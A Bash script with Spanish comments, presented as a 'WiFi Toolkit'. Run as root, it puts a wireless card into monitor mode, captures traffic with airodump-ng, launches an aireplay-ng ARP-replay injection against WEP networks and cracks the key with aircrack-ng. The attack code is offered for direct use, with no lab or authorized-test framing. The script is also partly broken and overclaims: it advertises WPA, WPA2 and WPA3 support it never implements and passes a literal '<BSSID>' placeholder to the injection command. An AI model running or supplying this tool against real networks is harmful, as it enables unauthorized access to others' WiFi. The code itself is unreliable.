#!/bin/bash

# ==========================================================
# WiFi Toolkit - Soporte WPA, WPA2, WPA3, WEP y Redes Abiertas
# ==========================================================

# Configuración de colores para mensajes
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

# Configuración global
PROJECT_NAME="wifi_toolkit"
DOWNLOADS_DIR="$HOME/Downloads"
PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog" "aireplay-ng" "packetforge-ng")

# ==========================================================
# Funciones
# ==========================================================

# Mostrar barra de progreso
show_progress() {
    dialog --title "Progreso" --gauge "$1" 10 50 0
    for i in $(seq 1 100); do
        echo $i
        sleep 0.02
    done | dialog --title "Progreso" --gauge "$1" 10 50 0
}

# Verificar permisos de administrador
check_permissions() {
    if [[ $EUID -ne 0 ]]; then
        dialog --title "Error" --msgbox "Este script debe ejecutarse como administrador. Usa 'sudo'." 8 40
        exit 1
    fi
}

# Crear carpetas de proyecto
prepare_project_directory() {
    for dir in "$PROJECT_DIR" "$RESULTS_DIR"; do
        if [[ ! -d "$dir" ]]; then
            mkdir -p "$dir" || { dialog --title "Error" --msgbox "Error al crear la carpeta $dir." 8 40; exit 1; }
        fi
    done
}

# Verificar e instalar dependencias
install_dependencies() {
    dialog --title "Instalación de dependencias" --infobox "Verificando dependencias..." 8 40
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v $dep &>/dev/null; then
            dialog --title "Instalación de dependencias" --infobox "Instalando $dep..." 8 40
            apt-get install -y $dep &>/dev/null || {
                dialog --title "Error" --msgbox "Error al instalar $dep." 8 40
                exit 1
            }
        fi
    done
    dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas." 8 40
}

# Detectar interfaz inalámbrica
detect_wireless_interface() {
    interface=$(iw dev | grep Interface | awk '{print $2}' | head -n 1)
    if [[ -z "$interface" ]]; then
        dialog --title "Error" --msgbox "No se encontró ninguna interfaz inalámbrica." 8 40
        exit 1
    fi
    echo "$interface"
}

# Activar modo monitor
enable_monitor_mode() {
    interface=$(detect_wireless_interface)
    dialog --title "Modo Monitor" --infobox "Activando modo monitor en $interface..." 8 40
    airmon-ng start $interface &>/dev/null || iw dev $interface set type monitor &>/dev/null
    dialog --title "Modo Monitor" --msgbox "Modo monitor activado en $interface." 8 40
}

# Escanear redes
scan_networks() {
    interface=$(detect_wireless_interface)
    dialog --title "Escaneo de Redes" --infobox "Escaneando redes durante 60 segundos..." 8 40
    xterm -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/scan_results" &
    show_progress "Escaneando redes inalámbricas"
    killall airodump-ng
    dialog --title "Escaneo de Redes" --msgbox "Escaneo completado. Resultados guardados en $RESULTS_DIR." 8 40
}

# Ataque a redes WEP
attack_wep() {
    dialog --title "Ataque WEP" --infobox "Preparando ataque WEP..." 8 40
    show_progress "Preparando ataque WEP"
    
    interface=$(detect_wireless_interface)
    cap_file=$(find $RESULTS_DIR -type f -name "*.cap" | head -n 1)
    
    if [[ -z "$cap_file" ]]; then
        dialog --title "Error" --msgbox "No se encontró ningún archivo .cap para atacar." 8 40
        return
    fi

    dialog --title "Ataque WEP" --msgbox "Iniciando ataque de reinyección ARP en la red WEP..." 8 40
    xterm -hold -e "aireplay-ng --arpreplay -b <BSSID> $interface" &
    sleep 10

    dialog --title "Ataque WEP" --msgbox "Intentando descifrar clave WEP..." 8 40
    aircrack-ng -z $cap_file > $RESULTS_DIR/wep_results.txt

    if grep -q "KEY FOUND" $RESULTS_DIR/wep_results.txt; then
        dialog --title "Clave WEP Encontrada" --msgbox "La clave WEP ha sido descifrada. Revisa el archivo $RESULTS_DIR/wep_results.txt." 8 40
    else
        dialog --title "Error" --msgbox "No se pudo descifrar la clave WEP." 8 40
    fi
}

# Gestión de redes abiertas
attack_open() {
    dialog --title "Redes Abiertas" --msgbox "Las redes abiertas no requieren descifrado. Puedes conectarte directamente desde tu gestor de redes." 8 40
}

# Menú principal
main_menu() {
    while true; do
        choice=$(dialog --clear --backtitle "WiFi Toolkit" \
            --title "Menú Principal" \
            --menu "Selecciona una opción:" 15 50 6 \
            1 "Instalar dependencias" \
            2 "Habilitar modo monitor" \
            3 "Escanear redes" \
            4 "Atacar redes WEP" \
            5 "Gestionar redes abiertas" \
            6 "Salir" 3>&1 1>&2 2>&3)

        case $choice in
            1) install_dependencies ;;
            2) enable_monitor_mode ;;
            3) scan_networks ;;
            4) attack_wep ;;
            5) attack_open ;;
            6) clear; exit 0 ;;
            *) dialog --title "Error" --msgbox "Opción inválida. Inténtalo de nuevo." 8 40 ;;
        esac
    done
}

# ==========================================================
# Ejecución
# ==========================================================
check_permissions
prepare_project_directory
main_menu
